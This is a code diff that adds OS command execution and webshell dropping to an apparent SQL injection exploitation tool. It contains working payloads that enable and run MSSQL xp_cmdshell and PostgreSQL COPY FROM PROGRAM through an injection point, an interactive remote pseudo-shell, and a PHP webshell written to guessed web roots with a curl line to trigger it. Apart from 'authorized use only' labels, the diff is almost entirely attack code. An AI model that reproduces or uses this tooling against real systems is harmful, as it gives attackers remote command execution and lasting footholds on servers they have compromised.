@@ -63,6 +63,8 @@ import urllib3
 DELIM = "QxZx"                      # marker wrapped around error-based leaks
 PROBE = "Prb0"                     # constant used to detect error reflection
 TRUE_COND, FALSE_COND = "1=1", "1=2"
+RCE_SHELL = "\x00rce-shell"        # sentinel: --rce with no command -> interactive shell
+RCE_TABLE = "bf_rce"              # scratch table that captures command output
 
 
 class RequestError(Exception):
@@ -105,6 +107,18 @@ class Dbms:
     def error_finalize(self, token):  # raw reflected token -> real value
         return token
 
+    # --- RCE. Two independent capabilities: command exec (needs stacked queries) and
+    #     webshell file-drop (needs file-write privilege). Either may be unsupported. ---
+    can_exec = False                  # COPY FROM PROGRAM / xp_cmdshell style command exec
+    can_webshell = False              # file write (INTO DUMPFILE / COPY TO)
+    def rce_setup(self): return []        # one-time enable statements (stacked)
+    def rce_exec(self, cmd): return []    # statements that run cmd, capturing output to RCE_TABLE
+    def rce_read(self): return None       # SELECT returning the captured output (read via oracle)
+    def rce_cleanup(self): return []      # tidy-up statements (stacked)
+    def webshell_write(self, path, content): return None   # statement that writes the file
+    def file_check(self, path, marker):    # scalar query: 'OK' if file exists and contains marker
+        return None
+
     # --- schema mapping queries (override per DBMS) ---
     list_sep = ","
     row_sep = "|"
@@ -132,6 +146,22 @@ class Postgres(Dbms):
         return f"SELECT pg_sleep({sleep}) WHERE {cond}"
     def error_expr(self, inner):
         return f"1=CAST(('{DELIM}'||({inner})||'{DELIM}') AS int)"
+    # RCE: COPY ... FROM PROGRAM (superuser) for exec; COPY (...) TO for webshell.
+    can_exec = True
+    can_webshell = True
+    def rce_exec(self, cmd):
+        return [f"DROP TABLE IF EXISTS {RCE_TABLE}",
+                f"CREATE TABLE {RCE_TABLE}(o text)",
+                f"COPY {RCE_TABLE} FROM PROGRAM {self.quote_str(cmd)}"]
+    def rce_read(self):
+        return f"SELECT string_agg(o, chr(10)) FROM {RCE_TABLE}"
+    def rce_cleanup(self):
+        return [f"DROP TABLE IF EXISTS {RCE_TABLE}"]
+    def webshell_write(self, path, content):
+        return f"COPY (SELECT {self.quote_str(content)}) TO {self.quote_str(path)}"
+    def file_check(self, path, marker):
+        return (f"SELECT CASE WHEN position({self.quote_str(marker)} in "
+                f"pg_read_file({self.quote_str(path)}))>0 THEN 'OK' ELSE 'NO' END")
 
 
 class MySQL(Dbms):
@@ -158,6 +188,15 @@ class MySQL(Dbms):
             return bytes.fromhex(token).decode("utf-8", "replace")
         except ValueError:
             return token
+    # RCE: no stacked command exec; webshell via INTO DUMPFILE (raw, hex-encoded payload).
+    # Needs FILE priv + a permissive secure_file_priv. Verify/read-back via LOAD_FILE.
+    can_webshell = True
+    def webshell_write(self, path, content):
+        return f"SELECT 0x{content.encode().hex()} INTO DUMPFILE {self.quote_str(path)}"
+    def file_check(self, path, marker):
+        like = self.quote_str("%" + marker + "%")
+        return (f"SELECT CASE WHEN LOAD_FILE({self.quote_str(path)}) LIKE {like} "
+                f"THEN 'OK' ELSE 'NO' END")
     def quote_ident(self, name): return "`" + name.replace("`", "``") + "`"
     def q_current_db(self): return "SELECT database()"
     def q_tables(self):
@@ -184,6 +223,19 @@ class MSSQL(Dbms):
         return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
     def error_expr(self, inner):
         return f"1=CAST(('{DELIM}'+CAST(({inner}) AS varchar(8000))+'{DELIM}') AS int)"
+    # RCE: enable + xp_cmdshell (sysadmin). Output captured into a table, read via oracle.
+    can_exec = True
+    def rce_setup(self):
+        return ["EXEC sp_configure 'show advanced options',1", "RECONFIGURE",
+                "EXEC sp_configure 'xp_cmdshell',1", "RECONFIGURE"]
+    def rce_exec(self, cmd):
+        return [f"IF OBJECT_ID('{RCE_TABLE}') IS NOT NULL DROP TABLE {RCE_TABLE}",
+                f"CREATE TABLE {RCE_TABLE}(l nvarchar(max) NULL)",
+                f"INSERT {RCE_TABLE} EXEC master..xp_cmdshell {self.quote_str(cmd)}"]
+    def rce_read(self):
+        return f"SELECT STRING_AGG(l,CHAR(10)) FROM {RCE_TABLE} WHERE l IS NOT NULL"
+    def rce_cleanup(self):
+        return [f"IF OBJECT_ID('{RCE_TABLE}') IS NOT NULL DROP TABLE {RCE_TABLE}"]
     def q_current_db(self): return "SELECT DB_NAME()"
     def q_tables(self):
         return ("SELECT STRING_AGG(table_name,',') FROM information_schema.tables "
@@ -738,6 +790,108 @@ def dump_mode(target, det, a):
         print(line(r))
 
 
+# ===========================================================================
+# RCE - OS command execution / webshell (authorized testing only)
+# ===========================================================================
+def _rce_send(target, det, stmts):
+    """Fire stacked statements through the injection point (no oracle / output)."""
+    ctx = det.ctx
+    prefix = "1" if ctx.close == "" else ""      # numeric param needs a value before ';'
+    body = ";".join(stmts)
+    target.send(f"{prefix}{ctx.close};{body}{det.dbms.comment}")
+
+
+WEBROOTS = [                          # common Linux web roots, tried when --os-path is omitted
+    "/var/www/html", "/var/www", "/usr/share/nginx/html", "/usr/local/apache2/htdocs",
+    "/srv/http", "/var/www/localhost/htdocs", "/app/static", "/home/site/wwwroot",
+]
+SHELL_EXTS = (".php", ".phtml", ".jsp", ".jspx", ".asp", ".aspx")
+
+
+def rce_mode(target, det, a):
+    """Direct OS command execution (PostgreSQL COPY FROM PROGRAM / MSSQL xp_cmdshell)."""
+    dbms = det.dbms
+    if not dbms.can_exec:
+        hint = " - try --webshell instead" if dbms.can_webshell else ""
+        print(f"[!] direct command exec is not supported for {dbms.name}{hint}")
+        return
+    if not dbms.stacked:
+        print(f"[!] command exec needs stacked queries, unavailable for {dbms.name}")
+        return
+
+    print(f"[*] enabling command execution on {dbms.name} (needs high privileges) ...", flush=True)
+    if dbms.rce_setup():
+        _rce_send(target, det, dbms.rce_setup())
+
+    def run_one(cmd):
+        _rce_send(target, det, dbms.rce_exec(cmd))
+        out = read_scalar(target, det, a, dbms.rce_read())
+        return out if out is not None else ""
+
+    try:
+        if a.rce == RCE_SHELL:
+            print("[*] interactive pseudo-shell - type a command, 'exit' to quit\n")
+            while True:
+                try:
+                    cmd = input("rce$ ").strip()
+                except EOFError:
+                    break
+                if cmd in ("exit", "quit"):
+                    break
+                if cmd:
+                    print(run_one(cmd))
+        else:
+            print(run_one(a.rce))
+    finally:
+        if dbms.rce_cleanup():
+            _rce_send(target, det, dbms.rce_cleanup())
+
+
+def _shell_targets(a, dbms):
+    """Build the list of candidate file paths to try for the webshell."""
+    name = a.shell_name
+    def as_file(p):
+        return p if p.lower().endswith(SHELL_EXTS) else p.rstrip("/") + "/" + name
+    if a.os_path:
+        return [as_file(a.os_path)]
+    cands = [as_file(r) for r in WEBROOTS]
+    if dbms.name == "mysql":            # DUMPFILE relative paths resolve from the datadir;
+        for k in range(2, 9):           # climb out with ../ and into the web root
+            cands.append("../" * k + "var/www/html/" + name)
+    return cands
+
+
+def webshell_mode(target, det, a):
+    """Drop a webshell file, verify the write through the oracle, and report the path."""
+    dbms = det.dbms
+    if not dbms.can_webshell:
+        hint = " - try --rce for command exec" if dbms.can_exec else ""
+        print(f"[!] webshell write is not supported for {dbms.name}{hint}")
+        return
+
+    marker = "BF_" + hashlib.sha1(str(time.time()).encode()).hexdigest()[:8]
+    content = a.shell_payload or f"<?php /*{marker}*/ system($_GET['c']); ?>"
+    if marker not in content:           # custom payload: still embed a marker comment to verify
+        content = f"<?php /*{marker}*/ ?>" + content
+    write_stackable = dbms.stacked      # PG can stack the write; MySQL usually cannot
+
+    targets = _shell_targets(a, dbms)
+    print(f"[*] attempting webshell drop on {dbms.name} ({len(targets)} candidate path(s)) ...", flush=True)
+    for path in targets:
+        if write_stackable:
+            _rce_send(target, det, [dbms.webshell_write(path, content)])
+        else:
+            target.send(dbms.webshell_write(path, content))   # standalone SELECT ... INTO DUMPFILE
+        chk = read_scalar(target, det, a, dbms.file_check(path, marker)) or ""
+        if "OK" in chk:
+            print(f"[+] webshell written and VERIFIED -> {path}")
+            print(f"    trigger it: curl 'http://<target>/<web-path>/{os.path.basename(path)}?c=id'")
+            return
+    print("[!] could not confirm any write (needs file-write priv + permissive policy).")
+    print("    pick a known web root with --os-path, or deliver this payload via your own vector:")
+    print(f"    {dbms.webshell_write(a.os_path or '/var/www/html/' + a.shell_name, content)}")
+
+
 # ---------------------------- resume / checkpoint ----------------------------
 def job_signature(a, det, target):
     raw = "|".join([target.method, target.url or "", target.data or "",
@@ -774,6 +928,16 @@ def main():
     act.add_argument("--query", help="extract a single SQL scalar (power mode)")
     act.add_argument("--dump", metavar="TABLE", help="dump rows of TABLE (columns auto-discovered)")
     act.add_argument("--max-rows", type=int, default=50, dest="max_rows", help="row cap for --dump (default 50)")
+    act.add_argument("--rce", nargs="?", const=RCE_SHELL, metavar="CMD",
+                     help="OS command via the DBMS (no CMD = interactive shell). Authorized use only")
+    act.add_argument("--webshell", action="store_true",
+                     help="drop a webshell file, verify it, and report the path. Authorized use only")
+
+    rg = ap.add_argument_group("rce / webshell options")
+    rg.add_argument("--os-path", dest="os_path",
+                    help="target file path or web-root dir for --webshell (else common roots are tried)")
+    rg.add_argument("--shell-name", dest="shell_name", default="bf.php", help="webshell filename")
+    rg.add_argument("--shell-payload", dest="shell_payload", help="custom webshell content")
 
     inj = ap.add_argument_group("injection")
     inj.add_argument("--marker", default="INJECT")
@@ -814,8 +978,9 @@ def main():
         ap.error("provide -u/--url (with -d/-H) or --request")
     if a.force_boolean and a.force_time:
         ap.error("--force-boolean and --force-time are mutually exclusive")
-    if a.query and a.dump:
-        ap.error("--query and --dump are mutually exclusive")
+    actions = sum(x for x in (a.query is not None, a.dump is not None, a.rce is not None, a.webshell))
+    if actions > 1:
+        ap.error("choose only one of --query / --dump / --rce / --webshell")
 
     target = Target(a)
 
@@ -831,6 +996,14 @@ def main():
     print(f"[*] detection cost: {target.count} requests")
 
     # ---- action dispatch ----
+    if a.rce is not None:
+        rce_mode(target, det, a)
+        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
+        return
+    if a.webshell:
+        webshell_mode(target, det, a)
+        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
+        return
     if a.dump:
         dump_mode(target, det, a)
         print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
